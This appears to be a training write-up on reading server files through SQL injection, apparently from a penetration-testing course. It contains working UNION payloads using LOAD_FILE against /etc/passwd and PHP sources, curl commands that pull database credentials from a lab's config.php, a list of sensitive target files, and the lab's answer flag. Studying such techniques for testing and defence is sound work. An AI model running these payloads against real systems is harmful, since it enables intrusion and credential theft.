# Section 14 — Reading Files

---

## Prerequisites — Check FILE Privilege

Before attempting file reads, confirm the DB user has `FILE` privilege.

```sql
-- Check if current user is superuser (Y = yes)
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- List all privileges for current user
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Look for `FILE` in the privilege_type column. Without it, `LOAD_FILE()` returns NULL.

---

## LOAD_FILE() — Read Local Files

```sql
-- Syntax
SELECT LOAD_FILE('/path/to/file');

-- As UNION injection (4-column table, column 2 visible)
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

> Only works if the MySQL OS user has read permission on the target file.

---

## File Read Attack Chain

When a PHP app uses an undeclared `$conn` variable, it was imported from an `include` or `require`. Read the source first to find the include path:

```sql
-- Step 1: Read the current page source
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
-- Look for: include "config.php";

-- Step 2: Read the included file
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
-- Exposes DB credentials
```

**Common target files:**

| File | What to look for |
|------|-----------------|
| `/etc/passwd` | OS users, home dirs, shell types |
| `/var/www/html/*.php` | Source code, credentials, include paths |
| `/etc/apache2/sites-enabled/*.conf` | Vhosts, document roots |
| `/proc/self/environ` | Environment variables |

---

## Lab — Find the Database Password

**Target:** `http://TARGET_IP:TARGET_PORT/search.php?port_code=`  
**Objective:** `$conn` isn't defined in search.php — find where it's imported and extract the DB password.

**Step 1 — Read search.php source, find the include:**

```bash
curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+SELECT+1,LOAD_FILE(%22/var/www/html/search.php%22),3,4--+-" \
  | python3 -c "import sys,html; print(html.unescape(sys.stdin.read()))" \
  | grep -E "(include|require)"
```

Output: `include "config.php";`

**Step 2 — Read config.php:**

```bash
curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+SELECT+1,LOAD_FILE(%22/var/www/html/config.php%22),3,4--+-" \
  | python3 -c "import sys,html; print(html.unescape(sys.stdin.read()))" \
  | grep "DB_"
```

**Result:**
```
'DB_HOST'     => 'localhost'
'DB_USERNAME' => 'root'
'DB_PASSWORD' => 'dB_pAssw0rd_iS_flag!'
'DB_DATABASE' => 'ilfreight'
```

**Q1 Answer:** `dB_pAssw0rd_iS_flag!`

---

## Exam Notes

- Always check `FILE` privilege before attempting `LOAD_FILE()` — if it's not granted, the function silently returns NULL
- `root@localhost` from `user()` almost always means `FILE` is available
- PHP source code leaks are high value: DB creds, API keys, other include paths, and business logic flaws
- `python3 -c "import sys,html; print(html.unescape(sys.stdin.read()))"` decodes HTML entities in the response — essential when PHP code renders inside a browser page
- Default Apache webroot is `/var/www/html/` — always start there for source code reads
